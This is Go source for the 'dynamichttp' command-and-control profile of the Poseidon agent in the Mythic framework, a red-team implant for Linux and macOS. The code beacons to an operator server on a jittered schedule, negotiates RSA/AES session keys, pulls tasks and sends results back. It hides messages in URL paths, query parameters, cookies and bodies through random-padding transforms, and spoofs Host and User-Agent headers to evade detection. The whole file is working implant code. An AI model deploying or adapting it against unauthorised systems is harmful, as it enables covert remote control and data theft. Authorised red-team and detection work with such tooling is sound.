//go:build (linux || darwin) && dynamichttp

package profiles

import (
	"bytes"
	"crypto/rsa"
	"encoding/base64"
	"errors"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"io"
	"net/url"
	"os"

	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"time"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// base64 encoded version of the JSON initial configuration of dynamichttp
var dynamichttp_initial_config string

type DynamicHTTPInitialConfig struct {
	Killdate               string                `json:"killdate"`
	Interval               uint                  `json:"callback_interval"`
	Jitter                 uint                  `json:"callback_jitter"`
	EncryptedExchangeCheck bool                  `json:"encrypted_exchange_check"`
	AESPSK                 string                `json:"AESPSK"`
	RawC2Config            C2DynamicHTTPC2Config `json:"raw_c2_config"`
}
type C2DynamicHTTPFunction struct {
	Function   string   `json:"function"`
	Parameters []string `json:"parameters"`
}
type C2DynamicHTTPModifyBlock struct {
	Name       string                  `json:"name"`
	Value      string                  `json:"value"`
	Transforms []C2DynamicHTTPFunction `json:"transforms"`
}
type C2DynamicHTTPAgentMessage struct {
	URLs            []string                   `json:"urls"`
	URI             string                     `json:"uri"`
	URLFunctions    []C2DynamicHTTPModifyBlock `json:"urlFunctions"`
	AgentHeaders    map[string]string          `json:"AgentHeaders"`
	QueryParameters []C2DynamicHTTPModifyBlock `json:"QueryParameters"`
	Cookies         []C2DynamicHTTPModifyBlock `json:"Cookies"`
	Body            []C2DynamicHTTPFunction    `json:"Body"`
}
type C2DynamicHTTPAgentConfig struct {
	ServerBody    []C2DynamicHTTPFunction     `json:"ServerBody"`
	ServerHeaders map[string]string           `json:"ServerHeaders"`
	ServerCookies map[string]string           `json:"ServerCookies"`
	AgentMessage  []C2DynamicHTTPAgentMessage `json:"AgentMessage"`
}
type C2DynamicHTTPC2Config struct {
	Get  C2DynamicHTTPAgentConfig `json:"GET"`
	Post C2DynamicHTTPAgentConfig `json:"POST"`
}
type C2DynamicHTTP struct {
	Interval       int       `json:"interval"`
	Jitter         int       `json:"jitter"`
	Killdate       time.Time `json:"kill_date"`
	ExchangingKeys bool
	ChunkSize      int `json:"chunk_size"`
	// internally set pieces
	Config         C2DynamicHTTPC2Config `json:"config"`
	Key            string                `json:"encryption_key"`
	RsaPrivateKey  *rsa.PrivateKey
	ShouldStop     bool
	stoppedChannel chan bool
}

// New creates a new DynamicHTTP C2 profile from the package's global variables and returns it
func init() {
	initialConfigBytes, err := base64.StdEncoding.DecodeString(dynamichttp_initial_config)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to decode initial dynamichttp config, exiting: %v\n", err))
		os.Exit(1)
	}
	initialConfig := DynamicHTTPInitialConfig{}
	err = json.Unmarshal(initialConfigBytes, &initialConfig)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial dynamichttp config, exiting: %v\n", err))
		os.Exit(1)
	}
	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
	if err != nil {
		utils.PrintDebug("Kill date failed to parse. Exiting.")
		os.Exit(1)
	}
	profile := C2DynamicHTTP{
		Key:            initialConfig.AESPSK,
		Killdate:       killDateTime,
		ShouldStop:     true,
		stoppedChannel: make(chan bool, 1),
	}

	// Convert sleep from string to integer
	profile.Interval = int(initialConfig.Interval)
	if profile.Interval < 0 {
		profile.Interval = 0
	}

	// Convert jitter from string to integer
	profile.Jitter = int(initialConfig.Jitter)
	if profile.Jitter < 0 {
		profile.Jitter = 0
	}

	// Add Agent Configuration
	profile.Config = initialConfig.RawC2Config
	profile.ExchangingKeys = initialConfig.EncryptedExchangeCheck
	RegisterAvailableC2Profile(&profile)
}

func (c *C2DynamicHTTP) Start() {
	// Checkin with Mythic via an egress channel
	// only try to start if we're in a stopped state
	if !c.ShouldStop {
		return
	}
	c.ShouldStop = false
	defer func() {
		c.stoppedChannel <- true
	}()
	for {

		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in Start before fully checking in\n"))
			return
		}
		checkIn := c.CheckIn()
		// If we successfully checkin, get our new ID and start looping
		if strings.Contains(checkIn.Status, "success") {
			for {
				if c.ShouldStop {
					utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in Start after fully checking in\n"))
					return
				}
				// loop through all task responses
				message := responses.CreateMythicPollMessage()
				if encResponse, err := json.Marshal(message); err == nil {
					//fmt.Printf("Sending to Mythic: %v\n", string(encResponse))
					resp := c.SendMessage(encResponse)
					if len(resp) > 0 {
						//fmt.Printf("Raw resp: \n %s\n", string(resp))
						taskResp := structs.MythicMessageResponse{}
						if err := json.Unmarshal(resp, &taskResp); err != nil {
							utils.PrintDebug(fmt.Sprintf("Error unmarshal response to task response: %s", err.Error()))
							time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
							continue
						}
						responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
					}
				} else {
					utils.PrintDebug(fmt.Sprintf("Failed to marshal message: %v\n", err))
				}
				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			}
		} else {
			//fmt.Printf("Uh oh, failed to checkin\n")
		}
	}

}
func (c *C2DynamicHTTP) Stop() {
	if c.ShouldStop {
		return
	}
	c.ShouldStop = true
	utils.PrintDebug("issued stop to http\n")
	<-c.stoppedChannel
	utils.PrintDebug("http fully stopped\n")
}
func (c *C2DynamicHTTP) UpdateConfig(parameter string, value string) {
	switch parameter {
	case "encryption_key":
		c.Key = value
	case "interval":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Interval = newInt
		}
	case "jitter":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Jitter = newInt
		}
	case "kill_date":
		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
		killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
		if err == nil {
			c.Killdate = killDateTime
		}
	case "config":
		if err := json.Unmarshal([]byte(value), &c.Config); err != nil {
			utils.PrintDebug(fmt.Sprintf("error trying to unmarshal new agent configuration: %v\n", err))
		}
	}
}
func (c *C2DynamicHTTP) GetSleepTime() int {
	if c.ShouldStop {
		return -1
	}
	if c.Jitter > 0 {
		jit := float64(rand.Int()%c.Jitter) / float64(100)
		jitDiff := float64(c.Interval) * jit
		if int(jit*100)%2 == 0 {
			return c.Interval + int(jitDiff)
		} else {
			return c.Interval - int(jitDiff)
		}
	} else {
		return c.Interval
	}
}
func (c *C2DynamicHTTP) SetSleepInterval(interval int) string {
	if interval >= 0 {
		c.Interval = interval
		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
	} else {
		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
	}

}
func (c *C2DynamicHTTP) SetSleepJitter(jitter int) string {
	if jitter >= 0 && jitter <= 100 {
		c.Jitter = jitter
		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
	} else {
		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
	}
}
func (c *C2DynamicHTTP) ProfileName() string {
	return "dynamichttp"
}
func (c *C2DynamicHTTP) IsP2P() bool {
	return false
}
func (c *C2DynamicHTTP) GetPushChannel() chan structs.MythicMessage {
	return nil
}

// CheckIn a new agent
func (c *C2DynamicHTTP) CheckIn() structs.CheckInMessageResponse {

	// Start Encrypted Key Exchange (EKE)
	if c.ExchangingKeys {
		for !c.NegotiateKey() {
			// loop until we successfully negotiate a key
			//fmt.Printf("trying to negotiate key\n")
			if c.ShouldStop {
				utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn while !c.NegotiateKey\n"))
				return structs.CheckInMessageResponse{}
			}
		}
	}
	for {
		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn\n"))
			return structs.CheckInMessageResponse{}
		}
		checkin := CreateCheckinMessage()
		if raw, err := json.Marshal(checkin); err != nil {
			time.Sleep(time.Duration(c.GetSleepTime()))
			continue
		} else {
			resp := c.SendMessage(raw)

			// save the Mythic id
			response := structs.CheckInMessageResponse{}
			if err = json.Unmarshal(resp, &response); err != nil {
				utils.PrintDebug(fmt.Sprintf("Error in unmarshal:\n %s", err.Error()))
				time.Sleep(time.Duration(c.GetSleepTime()))
				continue
			}
			if len(response.ID) != 0 {
				SetMythicID(response.ID)
				return response
			} else {
				time.Sleep(time.Duration(c.GetSleepTime()))
				continue
			}
		}

	}

}

// NegotiateKey - EKE key negotiation
func (c *C2DynamicHTTP) NegotiateKey() bool {
	sessionID := utils.GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	// Replace struct with dynamic json
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)
	//log.Println(unencryptedMsg)
	if err != nil {
		return false
	}

	resp := c.SendMessage(raw)
	// Decrypt & Unmarshal the response
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
	if c.ShouldStop {
		utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in NegotiateKey\n"))
		return false
	}
	err = json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error unmarshaling eke response: %s\n", err.Error()))
		return false
	}

	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	SetAllEncryptionKeys(c.Key)
	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID) // Save the new, temporary UUID
	} else {
		return false
	}

	return true
}
func (c *C2DynamicHTTP) SetEncryptionKey(newKey string) {
	c.Key = newKey
	c.ExchangingKeys = false
}
func (c *C2DynamicHTTP) GetConfig() string {
	jsonString, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return fmt.Sprintf("Failed to get config: %v\n", err)
	}
	return string(jsonString)
}
func (c *C2DynamicHTTP) IsRunning() bool {
	return !c.ShouldStop
}

func (c *C2DynamicHTTP) SendMessage(sendData []byte) []byte {
	// If the AesPSK is set, encrypt the data we send
	if len(c.Key) != 0 {
		//log.Printf("Encrypting Post data: %v\n", string(sendData))
		sendData = c.encryptMessage(sendData)
	}
	if GetMythicID() != "" {
		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUID
	} else {
		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
	}
	//fmt.Printf("Sending: %v\n", string(sendData))
	sendDataBase64 := []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes

	//byteBuffer := bytes.NewBuffer(sendDataBase64)
	// bail out of trying to send data after 5 failed attempts
	for i := 0; i < 5; i++ {
		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in SendMessage\n"))
			return []byte{}
		}
		//fmt.Printf("looping to send message: %v\n", sendDataBase64)
		today := time.Now()
		if today.After(c.Killdate) {
			os.Exit(1)
		}
		req, configUsed, err := c.CreateDynamicMessage(sendDataBase64)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Error creating new http request: %s", err.Error()))
			continue
		}

		resp, err := client.Do(req)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("error client.Do: %v\n", err))
			IncrementFailedConnection(c.ProfileName())
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}
		if resp.StatusCode != 200 {
			resp.Body.Close()
			utils.PrintDebug(fmt.Sprintf("error resp.StatusCode: %v\n", resp.StatusCode))
			IncrementFailedConnection(c.ProfileName())
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}
		raw, err := c.GetDynamicMessageResponse(resp, configUsed)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("error getting message response: %v\n", err))
			IncrementFailedConnection(c.ProfileName())
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}
		raw, err = base64.StdEncoding.DecodeString(string(raw))
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("error base64.StdEncoding: %v\n", err))
			IncrementFailedConnection(c.ProfileName())
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}
		if len(raw) < 36 {
			utils.PrintDebug(fmt.Sprintf("error len(raw) < 36: %v\n", err))
			IncrementFailedConnection(c.ProfileName())
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}
		if len(c.Key) != 0 {
			//log.Println("just did a post, and decrypting the message back")
			enc_raw := c.decryptMessage(raw[36:])
			if len(enc_raw) == 0 {
				// failed somehow in decryption
				utils.PrintDebug(fmt.Sprintf("error decrypt length wrong: %v\n", err))
				IncrementFailedConnection(c.ProfileName())
				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
				continue
			} else {
				//fmt.Printf("decrypted response: %v\n%v\n", string(raw[:36]), string(enc_raw))
				return enc_raw
			}
		} else {
			//fmt.Printf("response: %v\n", string(raw))
			return raw[36:]
		}
	}
	utils.PrintDebug(fmt.Sprintf("Aborting sending message after 5 failed attempts"))
	return make([]byte, 0) //shouldn't get here
}

// DynamicHTTP mutation functions
func (c *C2DynamicHTTP) base64(data []byte, parameters []string) ([]byte, error) {
	base64String := base64.StdEncoding.EncodeToString(data)
	return []byte(base64String), nil
}
func (c *C2DynamicHTTP) reverseBase64(data []byte, parameters []string) ([]byte, error) {
	return base64.StdEncoding.DecodeString(string(data))
}
func (c *C2DynamicHTTP) prepend(data []byte, parameters []string) ([]byte, error) {
	if len(parameters) != 1 {
		return nil, errors.New("need exactly 1 parameter for prepend")
	}
	return append([]byte(parameters[0]), data...), nil
}
func (c *C2DynamicHTTP) reversePrepend(data []byte, parameters []string) ([]byte, error) {
	if len(parameters) != 1 {
		return nil, errors.New("need exactly 1 parameter for prepend")
	}
	if len(data) <= len(parameters[0]) {
		return nil, errors.New("data needs to be longer than parameter to remove prepend")
	}
	return data[len(parameters[0]):], nil
}
func (c *C2DynamicHTTP) append(data []byte, parameters []string) ([]byte, error) {
	if len(parameters) != 1 {
		return nil, errors.New("need exactly 1 parameter for append")
	}
	return append(data, []byte(parameters[0])...), nil
}
func (c *C2DynamicHTTP) reverseAppend(data []byte, parameters []string) ([]byte, error) {
	if len(parameters) != 1 {
		return nil, errors.New("need exactly 1 parameter for append")
	}
	if len(data) <= len(parameters[0]) {
		return nil, errors.New("data needs to be longer than parameter to remove append")
	}
	return data[:len(data)-len(parameters[0])], nil
}
func (c *C2DynamicHTTP) randomMixed(data []byte, parameters []string) ([]byte, error) {
	letters := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	if len(parameters) != 1 {
		return nil, errors.New("need exactly 1 parameter for randomMixed to be the length")
	}
	length, err := strconv.Atoi(parameters[0])
	if err != nil {
		return nil, err
	}
	b := make([]byte, length)
	for i := range b {
		b[i] = letters[utils.RandomNumInRange(len(letters))]
	}
	return append(data, b...), nil
}
func (c *C2DynamicHTTP) reverseRandomMixed(data []byte, parameters []string) ([]byte, error) {
	if len(parameters) != 1 {
		return nil, errors.New("need exactly 1 parameter for reverseRandomMixed")
	}
	length, err := strconv.Atoi(parameters[0])
	if err != nil {
		return nil, err
	}
	if len(data) <= length {
		return nil, errors.New("data needs to be longer than parameter to remove randomMixed")
	}
	return data[:len(data)-length], nil
}
func (c *C2DynamicHTTP) randomNumber(data []byte, parameters []string) ([]byte, error) {
	letters := "0123456789"
	if len(parameters) != 1 {
		return nil, errors.New("need exactly 1 parameter for randomNumber to be the length")
	}
	length, err := strconv.Atoi(parameters[0])
	if err != nil {
		return nil, err
	}
	b := make([]byte, length)
	for i := range b {
		b[i] = letters[utils.RandomNumInRange(len(letters))]
	}
	return append(data, b...), nil
}
func (c *C2DynamicHTTP) reverseRandomNumber(data []byte, parameters []string) ([]byte, error) {
	if len(parameters) != 1 {
		return nil, errors.New("need exactly 1 parameter for reverseRandomNumber")
	}
	length, err := strconv.Atoi(parameters[0])
	if err != nil {
		return nil, err
	}
	if len(data) <= length {
		return nil, errors.New("data needs to be longer than parameter to remove randomNumber")
	}
	return data[:len(data)-length], nil
}
func (c *C2DynamicHTTP) randomAlpha(data []byte, parameters []string) ([]byte, error) {
	letters := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
	if len(parameters) != 1 {
		return nil, errors.New("need exactly 1 parameter for randomAlpha to be the length")
	}
	length, err := strconv.Atoi(parameters[0])
	if err != nil {
		return nil, err
	}
	b := make([]byte, length)
	for i := range b {
		b[i] = letters[utils.RandomNumInRange(len(letters))]
	}
	return append(data, b...), nil
}
func (c *C2DynamicHTTP) reverseRandomAlpha(data []byte, parameters []string) ([]byte, error) {
	if len(parameters) != 1 {
		return nil, errors.New("need exactly 1 parameter for reverseRandomAlpha")
	}
	length, err := strconv.Atoi(parameters[0])
	if err != nil {
		return nil, err
	}
	if len(data) <= length {
		return nil, errors.New("data needs to be longer than parameter to remove randomAlpha")
	}
	return data[:len(data)-length], nil
}
func (c *C2DynamicHTTP) chooseRandom(data []byte, parameters []string) ([]byte, error) {
	if len(parameters) == 0 {
		return nil, errors.New("need choices to choose from for chooseRandom")
	}
	choice := parameters[utils.RandomNumInRange(len(parameters))]
	return append(data, []byte(choice)...), nil
}
func (c *C2DynamicHTTP) reverseChooseRandom(data []byte, parameters []string) ([]byte, error) {
	if len(parameters) == 0 {
		return nil, errors.New("need at least 1 choice for choose random to reverse")
	}
	longestMatchingSuffixIndex := -1
	dataString := string(data)
	for i, _ := range parameters {
		if strings.HasSuffix(dataString, parameters[i]) {
			if longestMatchingSuffixIndex < 0 {
				longestMatchingSuffixIndex = i
				continue
			}
			if len(parameters[i]) > len(parameters[longestMatchingSuffixIndex]) {
				longestMatchingSuffixIndex = i
			}
		}
	}
	if longestMatchingSuffixIndex == -1 {
		return nil, errors.New("failed to find a matching suffix for reversing choose random")
	}
	return data[:len(data)-len(parameters[longestMatchingSuffixIndex])], nil
}
func (c *C2DynamicHTTP) performTransforms(initialData []byte, transforms []C2DynamicHTTPFunction) ([]byte, error) {
	tempModifier := initialData
	for j, _ := range transforms {
		switch transforms[j].Function {
		case "base64":
			newTemp, err := c.base64(tempModifier, transforms[j].Parameters)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "prepend":
			newTemp, err := c.prepend(tempModifier, transforms[j].Parameters)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "append":
			newTemp, err := c.append(tempModifier, transforms[j].Parameters)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "random_mixed":
			newTemp, err := c.randomMixed(tempModifier, transforms[j].Parameters)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "random_number":
			newTemp, err := c.randomNumber(tempModifier, transforms[j].Parameters)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "random_alpha":
			newTemp, err := c.randomAlpha(tempModifier, transforms[j].Parameters)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "choose_random":
			newTemp, err := c.chooseRandom(tempModifier, transforms[j].Parameters)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		default:
		}
	}
	return tempModifier, nil
}
func (c *C2DynamicHTTP) performReverseTransforms(initialData []byte, transforms []C2DynamicHTTPFunction) ([]byte, error) {
	tempModifier := initialData
	for j := len(transforms) - 1; j >= 0; j-- {
		switch transforms[j].Function {
		case "base64":
			newTemp, err := c.reverseBase64(tempModifier, transforms[j].Parameters)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "prepend":
			newTemp, err := c.reversePrepend(tempModifier, transforms[j].Parameters)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "append":
			newTemp, err := c.reverseAppend(tempModifier, transforms[j].Parameters)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "random_mixed":
			newTemp, err := c.reverseRandomMixed(tempModifier, transforms[j].Parameters)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "random_number":
			newTemp, err := c.reverseRandomNumber(tempModifier, transforms[j].Parameters)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "random_alpha":
			newTemp, err := c.reverseRandomAlpha(tempModifier, transforms[j].Parameters)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		case "choose_random":
			newTemp, err := c.reverseChooseRandom(tempModifier, transforms[j].Parameters)
			if err != nil {
				return nil, err
			}
			tempModifier = newTemp
		default:
		}
	}
	return tempModifier, nil
}
func (c *C2DynamicHTTP) updateURI(uri string, urlFunctions []C2DynamicHTTPModifyBlock, message *[]byte) (string, error) {
	tempURI := uri
	for i, _ := range urlFunctions {
		var tempModifier []byte
		if urlFunctions[i].Value == "message" {
			tempModifier = *message
		} else {
			tempModifier = []byte(urlFunctions[i].Value)
		}
		newValue, err := c.performTransforms(tempModifier, urlFunctions[i].Transforms)
		if err != nil {
			return "", err
		}
		tempURI = strings.Replace(tempURI, urlFunctions[i].Name, string(newValue), 1)
	}
	return tempURI, nil
}
func (c *C2DynamicHTTP) updateQueryParams(queryParameters []C2DynamicHTTPModifyBlock, message *[]byte) (string, error) {
	response := ""
	if len(queryParameters) > 0 {
		response += "?"
	}
	queryData := make([]string, len(queryParameters))
	for i, _ := range queryParameters {
		var tempModifier []byte
		if queryParameters[i].Value == "message" {
			tempModifier = *message
		} else {
			tempModifier = []byte(queryParameters[i].Value)
		}
		queryVal, err := c.performTransforms(tempModifier, queryParameters[i].Transforms)
		if err != nil {
			return "", err
		}
		queryData[i] = queryParameters[i].Name + "=" + url.QueryEscape(string(queryVal))
	}
	response += strings.Join(queryData, "&")
	return response, nil
}
func (c *C2DynamicHTTP) updateCookies(req *http.Request, cookies []C2DynamicHTTPModifyBlock, message *[]byte) error {
	for i, _ := range cookies {
		var tempModifier []byte
		if cookies[i].Value == "message" {
			tempModifier = *message
		} else {
			tempModifier = []byte(cookies[i].Value)
		}
		newVal, err := c.performTransforms(tempModifier, cookies[i].Transforms)
		if err != nil {
			return err
		}
		req.AddCookie(&http.Cookie{
			Name:  cookies[i].Name,
			Value: string(newVal),
		})
	}
	return nil
}
func (c *C2DynamicHTTP) isMessageOutsideBody(agentMessage C2DynamicHTTPAgentMessage) bool {
	for i, _ := range agentMessage.Cookies {
		if agentMessage.Cookies[i].Value == "message" {
			return true
		}
	}
	for i, _ := range agentMessage.QueryParameters {
		if agentMessage.QueryParameters[i].Value == "message" {
			return true
		}
	}
	for i, _ := range agentMessage.URLFunctions {
		if agentMessage.URLFunctions[i].Value == "message" {
			return true
		}
	}
	return false
}
func (c *C2DynamicHTTP) CreateDynamicMessage(content []byte) (*http.Request, *C2DynamicHTTPAgentConfig, error) {
	method := "GET"
	usedConfig := &c.Config.Get
	var agentMessage C2DynamicHTTPAgentMessage
	if len(c.Config.Get.AgentMessage) > 0 {
		agentMessage = c.Config.Get.AgentMessage[utils.RandomNumInRange(len(c.Config.Get.AgentMessage))]
	} else if len(c.Config.Post.AgentMessage) > 0 {
		method = "POST"
		usedConfig = &c.Config.Post
		agentMessage = c.Config.Post.AgentMessage[utils.RandomNumInRange(len(c.Config.Post.AgentMessage))]
	} else {
		return nil, nil, errors.New("no Get/Post options")
	}

	if len(content) > 4000 && len(c.Config.Post.AgentMessage) > 0 {
		// if the message length is too long, switch to POST instead
		method = "POST"
		usedConfig = &c.Config.Post
		agentMessage = c.Config.Post.AgentMessage[utils.RandomNumInRange(len(c.Config.Post.AgentMessage))]
	}
	// determine ahead of time if the content message is located in the body or in another field
	isMessageOutsideBody := c.isMessageOutsideBody(agentMessage)
	// pick the URL from the list of URLs randomly
	if len(agentMessage.URLs) == 0 {
		return nil, nil, errors.New("no urls to choose from")
	}
	postURL := agentMessage.URLs[utils.RandomNumInRange(len(agentMessage.URLs))]
	// generate the URL Path
	newURI, err := c.updateURI(agentMessage.URI, agentMessage.URLFunctions, &content)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to update the URI via transforms: %s", err.Error()))
		return nil, nil, err
	}
	// generate the Query parameters to be used
	newQueryParams, err := c.updateQueryParams(agentMessage.QueryParameters, &content)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to update the query parameters via transforms: %s", err.Error()))
		return nil, nil, err
	}
	// generate the request
	var bodyBuffer *bytes.Buffer
	var bodyBytes []byte
	if method == "POST" {
		if isMessageOutsideBody {
			// body starts with a different value
			bodyBytes, err = c.performTransforms([]byte{}, agentMessage.Body)
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("Failed to update the body via transforms: %s", err.Error()))
				return nil, nil, err
			}
		} else {
			bodyBytes, err = c.performTransforms(content, agentMessage.Body)
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("Failed to update the body via transforms: %s", err.Error()))
				return nil, nil, err
			}
		}
		if len(bodyBytes) == 0 {
			bodyBytes = make([]byte, 0)
		}
	} else {
		bodyBytes = make([]byte, 0)
	}
	bodyBuffer = bytes.NewBuffer(bodyBytes)
	utils.PrintDebug(fmt.Sprintf("method: %s\nURL: %s\n", method, postURL+newURI+newQueryParams))
	req, err := http.NewRequest(method, postURL+newURI+newQueryParams, bodyBuffer)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error creating new http request: %s", err.Error()))
		return nil, nil, err
	}
	// add cookies
	err = c.updateCookies(req, agentMessage.Cookies, &content)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error adding cookies: %s", err))
		return nil, nil, err
	}
	// add agent headers
	for key, _ := range agentMessage.AgentHeaders {
		if key == "Host" {
			req.Host = agentMessage.AgentHeaders[key]
		} else if key == "User-Agent" {
			req.Header.Set(key, agentMessage.AgentHeaders[key])
			tr.ProxyConnectHeader = http.Header{}
			tr.ProxyConnectHeader.Add("User-Agent", agentMessage.AgentHeaders[key])
		} else if key == "Content-Length" {
			continue
		} else {
			req.Header.Set(key, agentMessage.AgentHeaders[key])
		}
	}
	if method == "POST" {
		req.ContentLength = int64(len(bodyBytes))
	}
	return req, usedConfig, nil
}
func (c *C2DynamicHTTP) GetDynamicMessageResponse(resp *http.Response, config *C2DynamicHTTPAgentConfig) ([]byte, error) {
	body, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	// now that we have the body of the message response, we need to fetch out the response from it
	if err != nil {
		return nil, err
	}
	// verify that the server sent back everything we're expecting
	for key, _ := range config.ServerHeaders {
		if config.ServerHeaders[key] != resp.Header.Get(key) {
			utils.PrintDebug(fmt.Sprintf("Header '%s' is different from server and expected! %s vs %s", key, config.ServerHeaders[key], resp.Header.Get(key)))
			//return nil, errors.New("header mismatch from server")
		}
	}
	cookies := resp.Cookies()
	for key, _ := range config.ServerCookies {
		found := false
		for i, _ := range cookies {
			if cookies[i].Name == key {
				found = true
				if cookies[i].Value != config.ServerCookies[key] {
					utils.PrintDebug(fmt.Sprintf("Cookie '%s' is different from server and expected! %s vs %s", key, config.ServerCookies[key], cookies[i].Value))
					//return nil, errors.New("cookie mismatch from server")
				}
			}
		}
		if !found {
			utils.PrintDebug(fmt.Sprintf("Cookie %s is different from server and expected! %s vs %s", key, config.ServerCookies[key], "Not Found"))
			//return nil, errors.New("cookie mismatch from server")
		}
	}
	return c.performReverseTransforms(body, config.ServerBody)
}
func (c *C2DynamicHTTP) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}
func (c *C2DynamicHTTP) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}
